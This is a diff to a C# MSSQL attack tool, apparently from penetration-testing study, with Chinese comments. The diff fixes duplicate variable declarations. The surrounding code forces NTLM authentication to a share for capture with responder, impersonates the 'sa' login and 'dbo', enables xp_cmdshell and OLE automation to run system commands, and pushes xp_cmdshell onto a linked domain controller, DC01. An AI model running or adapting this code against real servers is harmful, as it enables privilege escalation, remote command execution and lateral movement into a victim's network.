@@ -71,21 +71,22 @@ namespace MSSQL
 			Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");//responser打爆破(sudo responder -I tun0)
 
 			// Get logins that we can impersonate
-			String res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
+			res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
 			Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
 
 			// Impersonate login and get login information
 			String su = executeQuery("SELECT SYSTEM_USER;", con);
 			String un = executeQuery("SELECT USER_NAME();", con);
 			Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
-			String res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
+			//EXECUTE AS語句來完成，它提供了一種在不同登錄名或用戶的上下文中執行 SQL 查詢的方法
+			res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
 			Console.WriteLine($"[*] Triggered impersonation.");
 			su = executeQuery("SELECT SYSTEM_USER;", con);
 			un = executeQuery("SELECT USER_NAME();", con);
 			Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
 
 			// Impersonate dbo in trusted database and execute through 'xp_cmdshell'
-			String res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
+		        res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
 			Console.WriteLine("[*] Triggered impersonation.");
 			res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
 			Console.WriteLine("[*] Enabled 'xp_cmdshell'.");
@@ -94,7 +95,7 @@ namespace MSSQL
 			Console.WriteLine($"[*] Executed command! Result: {res}");
 
 			// Impersonate dbo in trusted database and execute through 'sp_OACreate' 
-			String res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
+			res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
 			Console.WriteLine("[*] Triggered impersonation.");
 			res = executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
 			Console.WriteLine("[*] Enabled OLE automation procedures.");
@@ -107,11 +108,11 @@ namespace MSSQL
 			//
 
 			// Enumerate linked servers
-			String res = executeQuery("EXEC sp_linkedservers;", con);
+			res = executeQuery("EXEC sp_linkedservers;", con);
 			Console.WriteLine($"[*] Found linked servers: {res}");
 
 			// Execute on linked server
-			String res = executeQuery("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01;", con);
+			res = executeQuery("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01;", con);
 			Console.WriteLine($"[*] Enabled advanced options on DC01.");
 			res = executeQuery("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01;", con);
 			Console.WriteLine($"[*] Enabled xp_cmdshell option on DC01.");
@@ -119,7 +120,7 @@ namespace MSSQL
 			Console.WriteLine($"[*] Triggered command. Result: {res}");
 
 			// Execute on linked server via 'openquery'
-			String res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')", con);
+			res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')", con);
 			Console.WriteLine($"[*] Enabled advanced options on DC01.");
 			res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')", con);
 			Console.WriteLine($"[*] Enabled xp_cmdshell options on DC01.");
